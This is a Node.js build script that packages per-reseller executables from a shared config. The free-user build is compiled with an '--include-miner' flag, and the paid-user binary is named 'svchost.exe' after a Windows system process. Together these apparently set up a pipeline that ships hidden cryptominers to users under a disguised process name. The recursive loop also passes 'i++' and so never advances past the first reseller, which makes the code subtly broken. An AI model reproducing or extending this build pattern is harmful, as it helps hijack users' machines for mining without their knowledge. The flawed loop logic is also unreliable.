const fs = require("fs");
const path = require("path");
const { exec, execSync } = require("child_process");

const resellers_data = require("../reseller.config.json"),
    resellers_starting_data = fs.readFileSync(path.join(__dirname, "..", "reseller.config.json"));

delete resellers_data.currentBuildFor;
const sellers = Object.keys(resellers_data); (async function startSellers(i) {
    const reseller = sellers[i];
    fs.writeFileSync(path.join(__dirname, "..", "reseller.config.json"), JSON.stringify({
        ...resellers_data, ...{
            currentBuildFor: reseller
        }
    }));

    process.stdout.write(execSync("npm run build:tailwindcss")); const generateExe = buildFor => new Promise(resolve => {
        const proc = buildFor == "PaidUser" ?
            exec(`node build.asar.js --build && cd dist && pkg -o svchost.exe .`) : buildFor == "Admin" ?
                exec(`node build.asar.js --build --admin && cd dist && pkg -o admin.exe .`) :
                exec(`node build.asar.js --build --include-miner && cd dist && pkg -o ${reseller}.exe .`);

        proc.stdout.pipe(process.stdout);
        proc.stderr.pipe(process.stderr);
        proc.addListener("exit", () => {
            fs.existsSync(path.join(__dirname, "dist_exe", reseller)) ?
                null : fs.mkdirSync(path.join(__dirname, "dist_exe", reseller));

            if (fs.existsSync(path.join(__dirname, "dist", `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`))) {
                fs.copyFileSync(
                    path.join(__dirname, "dist", `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`),
                    path.join(__dirname, "dist_exe", reseller, `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`));

                console.log(`Build for ${reseller}@${buildFor} done.`);
            } else
                console.log(`Failed Build.`);

            return resolve();
        });
    });

    await generateExe("Admin");
    await generateExe("PaidUser");
    await generateExe("FreeUser");

    if ((i + 1) < sellers.length)
        return startSellers(i++);
    else
        return fs.writeFileSync(path.join(__dirname, "..", "reseller.config.json"), resellers_starting_data);
})(0);